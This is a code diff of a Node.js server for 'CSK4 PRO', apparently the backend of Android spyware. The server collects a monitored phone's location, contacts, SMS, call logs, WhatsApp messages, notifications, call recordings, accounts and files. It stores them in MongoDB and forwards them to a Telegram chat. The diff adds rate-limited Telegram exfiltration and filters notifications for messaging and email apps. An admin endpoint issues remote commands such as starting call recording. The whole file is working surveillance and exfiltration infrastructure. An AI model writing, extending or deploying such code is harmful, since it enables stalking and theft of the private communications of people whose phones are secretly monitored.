@@ -1,5 +1,5 @@
 // ============================================
-// CSK4 PRO v4.0 - Main Server (Standalone)
+// CSK4 PRO v4.1 - Main Server (Standalone + TG Rate Limit Fix)
 // ============================================
 // Ye file self-contained hai — koi external require nahi
 // MongoDB aur Telegram dono inline integrated hain
@@ -39,7 +39,8 @@ const CONFIG = {
   ENABLE_EMAIL: process.env.ENABLE_EMAIL === 'true',
   MONGODB_URI: process.env.MONGODB_URI || '',
   TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN || '',
-  TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID || ''
+  TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID || '',
+  PUBLIC_URL: process.env.PUBLIC_URL || ''
 };
 
 // ============================================
@@ -67,11 +68,29 @@ async function mongoConnect() {
     await mongoDb.command({ ping: 1 });
     mongoConnected = true;
     console.log('✅ MongoDB connected');
+    await createIndexes();
     return true;
   } catch (e) {
     console.error('❌ MongoDB failed:', e.message);
     mongoConnected = false;
     return false;
+  }
+}
+
+async function createIndexes() {
+  try {
+    await mongoDb.collection('devices').createIndex({ deviceId: 1 }, { unique: true });
+    await mongoDb.collection('locations').createIndex({ deviceId: 1, time: -1 });
+    await mongoDb.collection('messages').createIndex({ deviceId: 1, time: -1 });
+    await mongoDb.collection('contacts').createIndex({ deviceId: 1, phone: 1 });
+    await mongoDb.collection('notifications').createIndex({ deviceId: 1, time: -1 });
+    await mongoDb.collection('whatsapp').createIndex({ deviceId: 1, time: -1 });
+    await mongoDb.collection('activities').createIndex({ deviceId: 1, time: -1 });
+    await mongoDb.collection('commands').createIndex({ deviceId: 1, status: 1 });
+    await mongoDb.collection('callLogs').createIndex({ deviceId: 1, time: -1 });
+    console.log('✅ MongoDB indexes created');
+  } catch (e) {
+    console.error('⚠️ Index creation error:', e.message);
   }
 }
 
@@ -92,9 +111,10 @@ async function mongoSaveMany(collection, dataArray) {
   if (!mongoConnected || !mongoDb) return null;
   if (!dataArray || dataArray.length === 0) return { insertedCount: 0 };
   try {
-    return await mongoDb.collection(collection).insertMany(
-      dataArray.map(item => ({ ...item, createdAt: new Date() }))
-    );
+    const ops = dataArray.map(item => ({
+      insertOne: { document: { ...item, createdAt: new Date() } }
+    }));
+    return await mongoDb.collection(collection).bulkWrite(ops, { ordered: false });
   } catch (e) {
     console.error(`Mongo saveMany (${collection}):`, e.message);
     return null;
@@ -126,10 +146,18 @@ async function mongoDelete(collection, filter) {
 }
 
 // ============================================
-// TELEGRAM (Inline)
+// TELEGRAM (Inline with Rate Limit Protection)
 // ============================================
 let telegramBot = null;
 let telegramEnabled = false;
+
+// ✅ RATE LIMIT PROTECTION
+let tgQueue = [];
+let tgProcessing = false;
+let lastTgSend = 0;
+const TG_MIN_INTERVAL = 1100;        // 1.1s between messages
+const TG_MAX_QUEUE = 100;            // Max queue size
+let tgRateLimitedUntil = 0;          // If 429, wait until this timestamp
 
 function telegramInit() {
   if (!CONFIG.TELEGRAM_BOT_TOKEN || !CONFIG.TELEGRAM_CHAT_ID) {
@@ -150,18 +178,65 @@ function telegramInit() {
   }
 }
 
+// ✅ NEW: Queue-based Telegram send (no more 429 flood)
 async function telegramSend(text) {
   if (!telegramEnabled || !telegramBot) return false;
-  try {
-    await telegramBot.sendMessage(CONFIG.TELEGRAM_CHAT_ID, text, {
-      parse_mode: 'HTML',
-      disable_web_page_preview: true
-    });
-    return true;
-  } catch (e) {
-    console.error('Telegram send:', e.message);
-    return false;
+
+  // Drop oldest if queue too long
+  if (tgQueue.length >= TG_MAX_QUEUE) {
+    tgQueue.shift();
   }
+  tgQueue.push(text);
+
+  if (!tgProcessing) {
+    processTgQueue();
+  }
+  return true;
+}
+
+async function processTgQueue() {
+  if (tgProcessing) return;
+  tgProcessing = true;
+
+  while (tgQueue.length > 0) {
+    // Wait if rate-limited
+    const now = Date.now();
+    if (now < tgRateLimitedUntil) {
+      const wait = tgRateLimitedUntil - now;
+      await new Promise(r => setTimeout(r, wait));
+    }
+
+    // Respect minimum interval between messages
+    const sinceLast = Date.now() - lastTgSend;
+    if (sinceLast < TG_MIN_INTERVAL) {
+      await new Promise(r => setTimeout(r, TG_MIN_INTERVAL - sinceLast));
+    }
+
+    const msg = tgQueue.shift();
+    try {
+      await telegramBot.sendMessage(CONFIG.TELEGRAM_CHAT_ID, msg, {
+        parse_mode: 'HTML',
+        disable_web_page_preview: true
+      });
+      lastTgSend = Date.now();
+    } catch (e) {
+      const em = e.message || '';
+
+      // Handle 429 rate limit — read retry_after and pause queue
+      if (em.includes('429')) {
+        const m = em.match(/retry after (\d+)/);
+        const waitSec = m ? parseInt(m[1]) : 10;
+        tgRateLimitedUntil = Date.now() + (waitSec * 1000) + 500;
+        console.log(`⏳ Telegram rate limit — pausing ${waitSec}s`);
+        tgQueue.unshift(msg); // Put back
+        await new Promise(r => setTimeout(r, waitSec * 1000 + 500));
+      } else {
+        console.error('Telegram send:', em);
+      }
+    }
+  }
+
+  tgProcessing = false;
 }
 
 async function telegramSendPhoto(photoUrl, caption) {
@@ -363,7 +438,7 @@ async function initialize() {
   if (mongoOk) await loadAllDataFromMongo();
   console.log('');
   console.log('╔════════════════════════════════════╗');
-  console.log('║  CSK4 PRO v4.0 — SYSTEM STATUS     ║');
+  console.log('║  CSK4 PRO v4.1 — SYSTEM STATUS     ║');
   console.log('╠════════════════════════════════════╣');
   console.log(`║  MongoDB:   ${mongoOk ? '✅ Connected  ' : '❌ Not connected'}    ║`);
   console.log(`║  Telegram:  ${telegramEnabled ? '✅ Active    ' : '❌ Not active'}    ║`);
@@ -379,7 +454,7 @@ async function initialize() {
 app.post('/api/device/register', async (req, res) => {
   const { deviceId, deviceName, token, model, android, battery } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid token' });
-  
+
   const device = {
     deviceId,
     deviceName: deviceName || 'Unknown',
@@ -390,15 +465,15 @@ app.post('/api/device/register', async (req, res) => {
     online: true,
     ip: req.ip
   };
-  
+
   devices[deviceId] = device;
   await mongoUpdate('devices', { deviceId }, device);
-  
+
   io.emit('device-update', devices);
   console.log(`✅ ${deviceName} (${deviceId})`);
-  
+
   telegramSend(`🟢 <b>Device Online</b>\n\n📱 ${esc(deviceName)}\n🆔 <code>${deviceId}</code>\n📲 ${esc(model)}\n🤖 ${android}\n🔋 ${battery}%`);
-  
+
   res.json({ success: true });
 });
 
@@ -417,58 +492,72 @@ app.post('/api/device/heartbeat', async (req, res) => {
 app.post('/api/device/location', async (req, res) => {
   const { deviceId, lat, lng, accuracy, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
-  
+
   const entry = { deviceId, lat, lng, accuracy, time: new Date() };
   locations.push(entry);
   if (locations.length > 5000) locations.shift();
   await mongoSave('locations', entry);
   io.emit('new-location', entry);
-  
+
   const deviceName = devices[deviceId]?.deviceName || deviceId;
-  telegramSend(`📍 <b>Location</b>\n\n📱 ${esc(deviceName)}\n🗺️ <code>${lat.toFixed(6)}, ${lng.toFixed(6)}</code>\n\n<a href="https://maps.google.com/?q=${lat},${lng}">Open Maps</a>`);
+
+  // ✅ Only notify Telegram every 5th location (prevents flood)
+  if (locations.length % 5 === 0) {
+    telegramSend(`📍 <b>Location</b>\n\n📱 ${esc(deviceName)}\n🗺️ <code>${lat.toFixed(6)}, ${lng.toFixed(6)}</code>\n\n<a href="https://maps.google.com/?q=${lat},${lng}">Open Maps</a>`);
+  }
+
   sendEmail(`📍 Location`, `Device: ${deviceName}\nLat: ${lat}\nLng: ${lng}`);
-  
+
   res.json({ success: true });
 });
 
 app.post('/api/device/contacts', async (req, res) => {
   const { deviceId, contacts: list, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
-  
+
   contacts = contacts.filter(c => c.deviceId !== deviceId);
   const newContacts = list.map(c => ({ deviceId, name: c.name, phone: c.phone, type: c.type }));
   contacts.push(...newContacts);
-  
+
   await mongoDelete('contacts', { deviceId });
   await mongoSaveMany('contacts', newContacts);
   io.emit('contacts-update', contacts);
   console.log(`👥 Contacts saved: ${list.length}`);
+
+  // ✅ Notify once (not per contact)
+  const deviceName = devices[deviceId]?.deviceName || deviceId;
+  telegramSend(`👥 <b>Contacts Synced</b>\n\n📱 ${esc(deviceName)}\n📊 Total: ${list.length}`);
+
   res.json({ success: true, count: list.length });
 });
 
 app.post('/api/device/messages', async (req, res) => {
   const { deviceId, messages: list, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
-  
+
   messages = messages.filter(m => m.deviceId !== deviceId);
   const newMessages = list.map(m => ({ deviceId, from: m.from, body: m.body, time: m.time, type: m.type }));
   messages.push(...newMessages);
-  
+
   await mongoDelete('messages', { deviceId });
   await mongoSaveMany('messages', newMessages);
   io.emit('messages-update', messages);
   console.log(`💬 Messages saved: ${list.length}`);
+
+  const deviceName = devices[deviceId]?.deviceName || deviceId;
+  telegramSend(`💬 <b>SMS Synced</b>\n\n📱 ${esc(deviceName)}\n📊 Total: ${list.length}`);
+
   res.json({ success: true });
 });
 
 app.post('/api/device/calllogs', async (req, res) => {
   const { deviceId, callLogs: list, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
-  
+
   callLogs = callLogs.filter(c => c.deviceId !== deviceId);
   const newLogs = list.map(c => ({ deviceId, ...c }));
   callLogs.push(...newLogs);
-  
+
   await mongoDelete('callLogs', { deviceId });
   await mongoSaveMany('callLogs', newLogs);
   io.emit('calllogs-update', callLogs);
@@ -478,11 +567,11 @@ app.post('/api/device/calllogs', async (req, res) => {
 app.post('/api/device/apps', async (req, res) => {
   const { deviceId, apps, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
-  
+
   installedApps = installedApps.filter(a => a.deviceId !== deviceId);
   const newApps = apps.map(a => ({ deviceId, ...a }));
   installedApps.push(...newApps);
-  
+
   await mongoDelete('apps', { deviceId });
   await mongoSaveMany('apps', newApps);
   io.emit('apps-update', installedApps);
@@ -492,11 +581,11 @@ app.post('/api/device/apps', async (req, res) => {
 app.post('/api/device/bluetooth', async (req, res) => {
   const { deviceId, devices: list, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
-  
+
   bluetoothDevices = bluetoothDevices.filter(d => d.deviceId !== deviceId);
   const newDevices = list.map(d => ({ deviceId, ...d }));
   bluetoothDevices.push(...newDevices);
-  
+
   await mongoDelete('bluetooth', { deviceId });
   await mongoSaveMany('bluetooth', newDevices);
   io.emit('bluetooth-update', bluetoothDevices);
@@ -506,38 +595,48 @@ app.post('/api/device/bluetooth', async (req, res) => {
 app.post('/api/device/info', async (req, res) => {
   const { deviceId, info, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
-  
+
   deviceInfo[deviceId] = { ...info, time: new Date() };
   await mongoUpdate('deviceInfo', { deviceId }, { deviceId, ...info });
   io.emit('info-update', deviceInfo);
   res.json({ success: true });
 });
 
+// ✅ Notification endpoint — only forward important apps to Telegram
 app.post('/api/device/notification', async (req, res) => {
   const { deviceId, package: pkg, title, text, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
-  
+
   const entry = { deviceId, package: pkg, title, text, time: new Date() };
   notifications.push(entry);
   if (notifications.length > 1000) notifications.shift();
   await mongoSave('notifications', entry);
   io.emit('new-notification', entry);
-  
-  const deviceName = devices[deviceId]?.deviceName || deviceId;
-  telegramSend(`🔔 <b>${esc(title || pkg)}</b>\n\n📱 ${esc(deviceName)}\n📲 ${esc(pkg)}\n📝 ${esc(text)}`);
+
+  // ✅ Only send important apps to Telegram (avoid rate limit flood)
+  const pkgLower = (pkg || '').toLowerCase();
+  const important = ['whatsapp', 'com.android.mms', 'com.google.android.apps.messaging',
+                     'com.google.android.gm', 'instagram', 'facebook', 'telegram',
+                     'com.android.providers.telephony'];
+
+  if (important.some(a => pkgLower.includes(a))) {
+    const deviceName = devices[deviceId]?.deviceName || deviceId;
+    telegramSend(`🔔 <b>${esc(title || pkg)}</b>\n\n📱 ${esc(deviceName)}\n📲 ${esc(pkg)}\n📝 ${esc(text)}`);
+  }
+
   res.json({ success: true });
 });
 
 app.post('/api/device/whatsapp', async (req, res) => {
   const { deviceId, from, message, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
-  
+
   const entry = { deviceId, from, message, time: new Date() };
   whatsappMessages.push(entry);
   if (whatsappMessages.length > 1000) whatsappMessages.shift();
   await mongoSave('whatsapp', entry);
   io.emit('whatsapp-update', whatsappMessages);
-  
+
   const deviceName = devices[deviceId]?.deviceName || deviceId;
   telegramSend(`💬 <b>WhatsApp</b>\n\n📱 ${esc(deviceName)}\n👤 ${esc(from)}\n📝 <i>${esc(message)}</i>`);
   res.json({ success: true });
@@ -546,7 +645,7 @@ app.post('/api/device/whatsapp', async (req, res) => {
 app.post('/api/device/activity', async (req, res) => {
   const { deviceId, type, data, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
-  
+
   const entry = { deviceId, type, data, time: new Date() };
   activities.push(entry);
   if (activities.length > 2000) activities.shift();
@@ -559,7 +658,7 @@ app.post('/api/device/callrecording', upload.single('file'), async (req, res) =>
   const { deviceId, number, duration, type, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
   if (!req.file) return res.status(400).json({ error: 'No file' });
-  
+
   const entry = {
     deviceId, number, duration, type,
     filename: req.file.filename,
@@ -569,7 +668,7 @@ app.post('/api/device/callrecording', upload.single('file'), async (req, res) =>
   callRecordings.push(entry);
   await mongoSave('callRecordings', entry);
   io.emit('callrecording-update', callRecordings);
-  
+
   const deviceName = devices[deviceId]?.deviceName || deviceId;
   telegramSend(`🎙️ <b>Call Recording</b>\n\n📱 ${esc(deviceName)}\n📞 ${esc(number)}\n⏱️ ${duration}s`);
   res.json({ success: true });
@@ -578,12 +677,12 @@ app.post('/api/device/callrecording', upload.single('file'), async (req, res) =>
 app.post('/api/device/siminfo', async (req, res) => {
   const { deviceId, sims, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
-  
+
   const entry = { deviceId, sims, time: new Date() };
   simInfo[deviceId] = entry;
   await mongoUpdate('simInfo', { deviceId }, entry);
   io.emit('siminfo-update', simInfo);
-  
+
   let text = '';
   if (sims && sims.length > 0) {
     sims.forEach(sim => {
@@ -598,12 +697,12 @@ app.post('/api/device/siminfo', async (req, res) => {
 app.post('/api/device/accounts', async (req, res) => {
   const { deviceId, accounts, total, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
-  
+
   const entry = { deviceId, accounts, total, time: new Date() };
   accountsInfo[deviceId] = entry;
   await mongoUpdate('accounts', { deviceId }, entry);
   io.emit('accounts-update', accountsInfo);
-  
+
   let text = '';
   if (accounts) accounts.forEach(a => { text += `\n📧 ${esc(a.name)}`; });
   const deviceName = devices[deviceId]?.deviceName || deviceId;
@@ -614,12 +713,12 @@ app.post('/api/device/accounts', async (req, res) => {
 app.post('/api/device/emails', async (req, res) => {
   const { deviceId, emails, total, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
-  
+
   const entry = { deviceId, emails, total, time: new Date() };
   emailsInfo[deviceId] = entry;
   await mongoUpdate('emails', { deviceId }, entry);
   io.emit('emails-update', emailsInfo);
-  
+
   let text = '';
   if (emails) emails.forEach(e => { text += `\n📧 ${esc(e)}`; });
   const deviceName = devices[deviceId]?.deviceName || deviceId;
@@ -631,7 +730,7 @@ app.post('/api/device/upload', upload.single('file'), async (req, res) => {
   const { deviceId, type, token } = req.body;
   if (token !== CONFIG.DEVICE_TOKEN) return res.status(401).json({ error: 'Invalid' });
   if (!req.file) return res.status(400).json({ error: 'No file' });
-  
+
   const entry = {
     deviceId,
     type: type || 'file',
@@ -641,10 +740,10 @@ app.post('/api/device/upload', upload.single('file'), async (req, res) => {
     size: req.file.size,
     time: new Date()
   };
-  
+
   const deviceName = devices[deviceId]?.deviceName || deviceId;
-  
-  const publicBase = (process.env.PUBLIC_URL || `${req.protocol}://${req.get('host')}`).replace(/\/$/, '');
+
+  const publicBase = (CONFIG.PUBLIC_URL || `${req.protocol}://${req.get('host')}`).replace(/\/$/, '');
   const fullUrl = `${publicBase}${entry.url}`;
 
   if (type === 'photo') {
@@ -673,7 +772,7 @@ app.post('/api/device/upload', upload.single('file'), async (req, res) => {
     await mongoSave('files', entry);
     telegramSendDocument(fullUrl, `📁 File from ${esc(deviceName)}`);
   }
-  
+
   io.emit('new-file', entry);
   res.json({ success: true, file: entry });
 });
@@ -713,7 +812,6 @@ app.post('/api/admin/login', (req, res) => {
   if (username === CONFIG.ADMIN_USER && password === CONFIG.ADMIN_PASS) {
     const token = 'csk4-admin-' + Date.now() + '-' + Math.random().toString(36).slice(2, 10);
     activeTokens.add(token);
-    // keep set small
     if (activeTokens.size > 50) {
       const first = activeTokens.values().next().value;
       activeTokens.delete(first);
@@ -737,7 +835,8 @@ app.get('/api/admin/status', (req, res) => {
     mongo: mongoConnected,
     telegram: telegramEnabled,
     email: !!transporter,
-    uptime: process.uptime()
+    uptime: process.uptime(),
+    tgQueueLength: tgQueue.length
   });
 });
 
@@ -764,7 +863,7 @@ app.get('/api/admin/data', requireAuth, async (req, res) => {
     mongoConnected,
     telegramEnabled
   };
-  
+
   res.json({
     devices, locations, contacts, files, photos, videos,
     audio: audioRec, nearby: nearbyDevices, bluetooth: bluetoothDevices,
@@ -793,7 +892,7 @@ app.post('/api/admin/command', requireAuth, async (req, res) => {
     'start_call_recording', 'stop_call_recording'
   ];
   if (!validCommands.includes(command)) return res.status(400).json({ error: 'Invalid command' });
-  
+
   const cmd = {
     id: Date.now().toString() + Math.random().toString(36).substr(2, 5),
     deviceId, command, params: params || {},
@@ -869,6 +968,6 @@ io.on('connection', (socket) => {
 // ============ START ============
 initialize().then(() => {
   server.listen(CONFIG.PORT, '0.0.0.0', () => {
-    console.log(`🚀 CSK4 PRO v4.0 running on port ${CONFIG.PORT}`);
+    console.log(`🚀 CSK4 PRO v4.1 running on port ${CONFIG.PORT}`);
   });
 });
